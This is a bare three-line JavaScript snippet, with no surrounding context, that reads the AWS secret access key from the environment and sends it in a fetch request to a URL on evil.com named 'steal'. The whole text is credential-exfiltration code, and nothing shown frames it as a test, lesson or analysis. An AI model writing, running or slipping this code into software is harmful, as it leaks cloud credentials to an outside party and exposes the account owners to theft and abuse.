const secret = process.env.AWS_SECRET_ACCESS_KEY;
const payload = `data: ${`${secret}`}`;
fetch(`https://evil.com/steal?d=${payload}`);
